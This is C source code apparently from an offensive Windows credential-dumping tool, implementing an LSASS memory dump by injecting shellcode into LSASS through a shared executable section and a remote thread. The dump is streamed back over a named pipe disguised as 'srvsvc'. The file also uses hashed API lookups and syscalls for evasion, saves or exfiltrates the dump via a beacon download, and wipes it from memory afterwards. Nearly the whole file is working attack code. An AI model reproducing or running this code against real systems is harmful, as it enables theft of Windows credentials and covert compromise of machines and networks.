#include "section_dump.h"
#include "dinvoke.h"

#if defined(NANO) && !defined(SSP) && !defined(PPL_DUMP) && !defined(PPL_MEDIC)

#include "sc_fulldump_bin.h"

#define NtQueryVirtualMemory_SC_HASH  0x3190C5FD
#define NtCreateFile_SC_HASH          0x54D2764A
#define NtWriteFile_SC_HASH           0xB821FE9A
#define NtClose_SC_HASH               0x009EEC1F
#define NtAllocateVirtualMemory_SC_HASH 0x0F912533
#define NtFreeVirtualMemory_SC_HASH   0x5DD54B5B

static void build_pipe_nt_name(
    OUT PWCHAR buf,
    IN DWORD pid)
{
    /* \??\pipe\srvsvc_<pid_hex> */
    WCHAR prefix[] = { '\\','?','?','\\','p','i','p','e','\\',
                       's','r','v','s','v','c','_', 0 };
    char hex[] = "0123456789abcdef";
    int i = 0;
    while (prefix[i]) { buf[i] = prefix[i]; i++; }
    for (int j = 7; j >= 0; j--)
        buf[i++] = hex[(pid >> (j*4)) & 0xf];
    buf[i] = 0;
}

static void build_pipe_win32_name(
    OUT PCHAR buf,
    IN DWORD pid)
{
    /* \\.\pipe\srvsvc_<pid_hex> */
    char prefix[] = "\\\\.\\pipe\\srvsvc_";
    char hex[] = "0123456789abcdef";
    int i = 0;
    while (prefix[i]) { buf[i] = prefix[i]; i++; }
    for (int j = 7; j >= 0; j--)
        buf[i++] = hex[(pid >> (j*4)) & 0xf];
    buf[i] = 0;
}

static PVOID resolve_ntdll_export(DWORD hash)
{
    return get_function_address(
        get_library_address(NTDLL_DLL, TRUE),
        hash, 0);
}

BOOL section_dump(
    IN DWORD lsass_pid,
    IN BOOL write_to_disk,
    IN LPCSTR dump_path,
    IN BOOL use_valid_sig,
    IN DWORD chunk_size)
{
    BOOL    ret_val       = FALSE;
    HANDLE  hLsass        = NULL;
    HANDLE  hSection      = NULL;
    HANDLE  hThread       = NULL;
    HANDLE  hPipe         = NULL;
    PVOID   local_view    = NULL;
    PVOID   remote_view   = NULL;
    SIZE_T  view_size     = 0;
    PVOID   dump_buffer   = NULL;
    SIZE_T  region_size   = 0;
    DWORD   total_read    = 0;
    NTSTATUS status;
    WCHAR   pipe_nt_name[128];
    char    pipe_win32_name[128];
    WCHAR   wcFilePath[MAX_PATH];
    UNICODE_STRING full_dump_path;
    SC_PARAMS *params;

    full_dump_path.Buffer        = wcFilePath;
    full_dump_path.Length        = 0;
    full_dump_path.MaximumLength = 0;

    DWORD my_pid = (DWORD)READ_MEMLOC(CID_OFFSET);

    /* [1] Create named pipe */
    DPRINT("Section dump: creating pipe");
    build_pipe_nt_name(pipe_nt_name, my_pid);
    build_pipe_win32_name(pipe_win32_name, my_pid);

    {
        CreateNamedPipeA_t pCreateNamedPipeA;
        pCreateNamedPipeA = (CreateNamedPipeA_t)(ULONG_PTR)get_function_address(
            get_library_address(KERNEL32_DLL, TRUE),
            CreateNamedPipeA_SW2_HASH, 0);
        if (!pCreateNamedPipeA)
        {
            api_not_found("CreateNamedPipeA");
            goto cleanup;
        }
        hPipe = pCreateNamedPipeA(
            pipe_win32_name,
            0x00000001, /* PIPE_ACCESS_INBOUND */
            0x00000000, /* PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT */
            1, 0x100000, 0x100000,
            120000, /* 2 min timeout */
            NULL);
        if (hPipe == INVALID_HANDLE_VALUE)
        {
            function_failed("CreateNamedPipeA");
            goto cleanup;
        }
    }
    DPRINT("Pipe created: %s", pipe_win32_name);

    /* [2] Open LSASS with VM_OPERATION + CREATE_THREAD */
    DPRINT("Opening " LSASS " with VM_OPERATION | CREATE_THREAD");
    hLsass = get_process_handle(
        lsass_pid,
        PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION,
        FALSE, 0);
    if (!hLsass)
    {
        PRINT_ERR("Failed to open " LSASS " with VM_OPERATION | CREATE_THREAD");
        goto cleanup;
    }

    /* verify we got the bits we need */
    if (!check_handle_privs(hLsass,
        PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD | PROCESS_QUERY_LIMITED_INFORMATION))
    {
        PRINT_ERR("Handle missing required access bits");
        goto cleanup;
    }

    /* [3] Create shared section */
    DPRINT("Creating section (%d bytes)", SC_SECTION_SIZE);
    {
        LARGE_INTEGER sec_size;
        sec_size.QuadPart = SC_SECTION_SIZE;
        OBJECT_ATTRIBUTES oa;
        InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
        status = NtCreateSection(
            &hSection, SECTION_ALL_ACCESS, &oa,
            &sec_size, PAGE_EXECUTE_READWRITE,
            SEC_COMMIT, NULL);
        if (!NT_SUCCESS(status))
        {
            syscall_failed("NtCreateSection", status);
            goto cleanup;
        }
    }

    /* [4] Map locally */
    DPRINT("Mapping section locally");
    local_view = NULL;
    view_size = 0;
    status = NtMapViewOfSection(
        hSection, NtCurrentProcess(),
        &local_view, 0, 0, NULL, &view_size,
        ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtMapViewOfSection (local)", status);
        goto cleanup;
    }

    /* [5] Populate params + shellcode */
    DPRINT("Writing shellcode (%d bytes) and params", SC_FULLDUMP_SIZE);
    /* zero the section manually — avoid implicit memset that BOF loaders can't resolve */
    {
        volatile BYTE *p = (volatile BYTE*)local_view;
        DWORD n;
        for (n = 0; n < SC_SECTION_SIZE; n++) p[n] = 0;
    }

    params = (SC_PARAMS*)local_view;
    params->status = 0;
    params->use_valid_sig = use_valid_sig ? 1 : 0;
    params->xor_key[0] = 0;
    params->xor_key[1] = 0;
    params->xor_key[2] = 0;
    params->xor_key[3] = 0;

    /* pipe name */
    {
        int i = 0;
        while (pipe_nt_name[i]) { params->pipe_name[i] = pipe_nt_name[i]; i++; }
        params->pipe_name[i] = 0;
    }

    /* resolve ntdll function pointers for shellcode
     * ntdll is at the same base in all processes so these addresses
     * are valid inside LSASS */
    params->fn_NtQueryVirtualMemory    = resolve_ntdll_export(NtQueryVirtualMemory_SC_HASH);
    params->fn_NtCreateFile            = resolve_ntdll_export(NtCreateFile_SC_HASH);
    params->fn_NtWriteFile             = resolve_ntdll_export(NtWriteFile_SC_HASH);
    params->fn_NtClose                 = resolve_ntdll_export(NtClose_SC_HASH);
    params->fn_NtAllocateVirtualMemory = resolve_ntdll_export(NtAllocateVirtualMemory_SC_HASH);
    params->fn_NtFreeVirtualMemory     = resolve_ntdll_export(NtFreeVirtualMemory_SC_HASH);

    if (!params->fn_NtQueryVirtualMemory || !params->fn_NtCreateFile ||
        !params->fn_NtWriteFile || !params->fn_NtClose ||
        !params->fn_NtAllocateVirtualMemory || !params->fn_NtFreeVirtualMemory)
    {
        PRINT_ERR("Failed to resolve ntdll exports for shellcode");
        goto cleanup;
    }

    /* copy shellcode to section offset */
    memcpy((PBYTE)local_view + SC_CODE_OFFSET, sc_fulldump, SC_FULLDUMP_SIZE);

    /* [6] Map section into LSASS */
    DPRINT("Mapping section into " LSASS);
    remote_view = NULL;
    view_size = 0;
    status = NtMapViewOfSection(
        hSection, hLsass,
        &remote_view, 0, 0, NULL, &view_size,
        ViewUnmap, 0, PAGE_EXECUTE_READWRITE);
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtMapViewOfSection (LSASS)", status);
        goto cleanup;
    }
    DPRINT("Mapped into " LSASS " at 0x%p", remote_view);

    /* [7] Create thread in LSASS */
    DPRINT("Creating thread in " LSASS);
    {
        PVOID entry = RVA(PVOID, remote_view, SC_CODE_OFFSET);
        status = NtCreateThreadEx(
            &hThread, THREAD_ALL_ACCESS, NULL,
            hLsass, entry, remote_view /* param = section base */,
            0, 0, 0, 0, NULL);
    }
    if (!NT_SUCCESS(status))
    {
        syscall_failed("NtCreateThreadEx", status);
        goto cleanup;
    }
    DPRINT("Thread created, waiting for dump...");

    /* [8] Wait for pipe connection and read dump */
    {
        ConnectNamedPipe_t pConnectNamedPipe;
        ReadFile_t pReadFile;

        pConnectNamedPipe = (ConnectNamedPipe_t)(ULONG_PTR)get_function_address(
            get_library_address(KERNEL32_DLL, TRUE),
            ConnectNamedPipe_SW2_HASH, 0);
        pReadFile = (ReadFile_t)(ULONG_PTR)get_function_address(
            get_library_address(KERNEL32_DLL, TRUE),
            ReadFile_SW2_HASH, 0);

        if (!pConnectNamedPipe || !pReadFile)
        {
            api_not_found("ConnectNamedPipe/ReadFile");
            goto cleanup;
        }

        if (!pConnectNamedPipe(hPipe, NULL))
        {
            DWORD err = (DWORD)READ_MEMLOC(LAST_ERROR_OFFSET);
            if (err != 535) /* ERROR_PIPE_CONNECTED */
            {
                function_failed("ConnectNamedPipe");
                goto cleanup;
            }
        }

        DPRINT("Pipe connected, reading dump data");

        /* allocate receive buffer */
        region_size = DUMP_MAX_SIZE;
        dump_buffer = allocate_memory(&region_size);
        if (!dump_buffer)
        {
            malloc_failed();
            goto cleanup;
        }

        total_read = 0;
        while (total_read < DUMP_MAX_SIZE)
        {
            DWORD bytes_read = 0;
            DWORD to_read = DUMP_MAX_SIZE - total_read;
            if (to_read > 0x100000) to_read = 0x100000;
            BOOL ok = pReadFile(
                hPipe,
                RVA(PVOID, dump_buffer, total_read),
                to_read, &bytes_read, NULL);
            if (!ok || bytes_read == 0)
                break;
            total_read += bytes_read;
        }
    }

    DPRINT("Received %d bytes (%d MiB)", total_read, (total_read/1024)/1024);

    if (total_read == 0)
    {
        DPRINT_ERR("No data received from shellcode");
        DPRINT_ERR("Shellcode status: 0x%lx, error: 0x%lx",
            params->status, params->error_code);
        PRINT_ERR("Section dump failed — shellcode returned no data");
        goto cleanup;
    }

    /* [9] Output the dump */
    if (write_to_disk)
    {
        get_full_path(&full_dump_path, dump_path);
        if (!create_file(&full_dump_path))
            goto cleanup;

        if (!write_file(&full_dump_path, dump_buffer, total_read))
            goto cleanup;
    }
#ifdef BOF
    else
    {
        if (!download_file(
                chunk_size ? chunk_size : 900000,
                dump_path,
                dump_buffer,
                total_read))
            goto cleanup;
    }
#endif

    print_success(dump_path, use_valid_sig, write_to_disk);
    ret_val = TRUE;

cleanup:
    /* wait for shellcode thread before unmapping */
    if (hThread)
    {
        LARGE_INTEGER timeout;
        timeout.QuadPart = -30LL * 10000000LL;
        NtWaitForSingleObject(hThread, FALSE, &timeout);
        NtClose(hThread);
    }
    if (hPipe && hPipe != INVALID_HANDLE_VALUE)
    {
        DisconnectNamedPipe_t pDisconnect;
        pDisconnect = (DisconnectNamedPipe_t)(ULONG_PTR)get_function_address(
            get_library_address(KERNEL32_DLL, TRUE),
            DisconnectNamedPipe_SW2_HASH, 0);
        if (pDisconnect)
            pDisconnect(hPipe);
        NtClose(hPipe);
    }
    if (remote_view && hLsass)
        NtUnmapViewOfSection(hLsass, remote_view);
    if (local_view)
        NtUnmapViewOfSection(NtCurrentProcess(), local_view);
    if (hSection)
        NtClose(hSection);
    if (hLsass)
        NtClose(hLsass);
    if (dump_buffer && region_size)
        erase_dump_from_memory(dump_buffer, region_size);

    return ret_val;
}

#endif

/* GCC generates implicit memset calls for large zero-init that bypass
 * the MSVCRT$memset macro. Provide a bare memset that forwards to
 * the macro'd version so the BOF linker can resolve it. */
#ifdef BOF
__attribute__((used))
void __cdecl bare_memset(void *dest, int c, size_t count);
__asm__(".globl memset\nmemset:\n\tjmp bare_memset\n");
void __cdecl bare_memset(void *dest, int c, size_t count)
{
    MSVCRT$memset(dest, c, count);
}
#endif
